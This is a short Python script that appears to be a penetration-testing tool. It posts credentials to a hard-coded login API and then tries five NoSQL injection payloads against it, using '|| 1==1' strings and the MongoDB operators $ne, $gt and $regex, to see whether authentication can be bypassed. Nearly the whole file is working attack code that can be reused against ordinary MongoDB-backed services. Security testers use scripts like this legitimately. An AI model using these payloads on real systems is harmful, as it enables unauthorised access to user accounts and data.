
##
##

import requests
import json

# Define the URL for the API endpoint
url = "http://11.11.11.11:9999/api/login"

# Known valid credentials for initial test
valid_creds = {
    "username": "person",
    "password": "person"
}

# Function to send a POST request to the login endpoint
def test_login(credentials):
    headers = {
        "Content-Type": "application/json"
    }
    # Sending request and capturing the response
    print(f"\n[INFO] Testing credentials: {credentials}")
    response = requests.post(url, headers=headers, data=json.dumps(credentials))

    # Display status and response
    print("Status Code:", response.status_code)
    try:
        print("Response JSON:", response.json())
    except json.JSONDecodeError:
        print("Response (non-JSON):", response.text)

    return response

# Phase 1: Test with valid credentials
print("\n[PHASE 1] Testing with known valid credentials")
response = test_login(valid_creds)
print("[RESULT] Initial test with valid credentials complete.")

# Define potential NoSQL injection payloads to test
payloads = [
    {"username": "pentest' || 1==1 //", "password": "invalid"},
    {"username": "pentest' && this.password == 'pentest", "password": "pentest"},
    {"username": {"$ne": None}, "password": {"$ne": None}},  # MongoDB-specific
    {"username": {"$gt": ""}, "password": {"$gt": ""}},      # Testing with comparisons
    {"username": "pentest", "password": {"$regex": ".*"}}    # Regex-based injection attempt
]

# Phase 2: Test NoSQL injection payloads
print("\n[PHASE 2] Testing with NoSQL injection payloads")
for i, payload in enumerate(payloads, 1):
    print(f"\n[INFO] Testing payload {i}/{len(payloads)}: {payload}")
    response = test_login(payload)

    # Interpret response for each payload
    if response.status_code == 200:
        print("[WARNING] Potential vulnerability: Login succeeded with injected payload.")
    elif response.status_code in [401, 403]:
        print("[INFO] Login attempt failed, injection likely not successful.")
    else:
        print(f"[INFO] Received unusual status code {response.status_code}. Further investigation may be needed.")

    print("-" * 50)

print("\n[COMPLETE] NoSQL injection testing completed.")

##
##
